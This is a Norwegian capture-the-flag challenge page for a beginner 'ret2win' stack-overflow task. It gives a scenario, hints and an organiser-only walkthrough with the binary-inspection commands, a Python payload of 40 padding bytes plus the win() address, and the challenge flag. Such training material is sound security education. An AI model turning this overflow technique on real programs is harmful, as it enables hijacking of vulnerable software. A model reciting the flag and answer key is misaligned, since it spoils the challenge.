# Retur til vaktbua

**Kategori:** Pwn
**Poeng:** 100
**Type:** Statisk fil (Linux ELF)
**Vanskelighetsgrad:** Lett

---

## Scenario

Nordverk har satt opp en liten innsjekk i vaktbua på konferanseområdet.
Programmet spør bare etter navn, men køsystemet har en skjult VIP-rutine.

Få programmet til å hoppe dit.

---

## Vedlegg

- [`retur_vaktbua`](retur_vaktbua), Linux x86-64 ELF

Kjør lokalt:

chmod +x retur_vaktbua
./retur_vaktbua

---

## Flaggformat

CTF{...}

---

## Hints

| Kostnad | Hint |
|---------|------|
| Gratis | `checksec --file=retur_vaktbua` viser hvorfor dette ikke er shellcode. |
| 10 poeng | Binæren er ikke strippet. Se etter en funksjon som høres ut som målet. |
| 20 poeng | Bufferen er 32 bytes. Husk saved RBP før saved RIP på amd64. |
| 30 poeng | Bruk offseten og adressen til mål-funksjonen. Adressen må pakkes som en 64-bit little-endian verdi. |

---

## Løsningsvei (kun for arrangør)

Dette er en enkel ret2win-oppgave uten remote service. Deltakeren skal utnytte
en stack overflow lokalt og få programmet til å hoppe til `win()`.

1. Sjekk binæren:

   ```bash
   file retur_vaktbua
   checksec --file=retur_vaktbua
   ```

   Forventet: 64-bit ELF, ikke strippet, ingen canary, NX aktiv, ikke PIE.
   NX betyr at shellcode ikke er riktig vei. Ikke PIE betyr at adressen til
   `win()` er stabil.

2. Finn `win()`:

   ```bash
   nm -n retur_vaktbua | grep ' win$'
   ```

   Forventet adresse etter bygg:

   ```text
   0000000000401186 T win
   ```

3. Finn overflowen:

   ```bash
   objdump -d retur_vaktbua | grep -A35 '<registrer>:'
   ```

   `registrer()` reserverer `0x20` bytes på stacken og kaller `gets()`.
   Offset til saved RIP er `32 + 8 = 40` bytes.

4. Bygg payload:

   ```bash
   python3 - <<'PY' | ./retur_vaktbua
   import struct, sys
   payload = b"A" * 40
   payload += struct.pack("<Q", 0x401186)
   sys.stdout.buffer.write(payload + b"\n")
   PY
   ```

5. Programmet hopper til `win()`, dekoder flagget og printer det.

**Flagg:** `CTF{ret2win_forste_steg}`
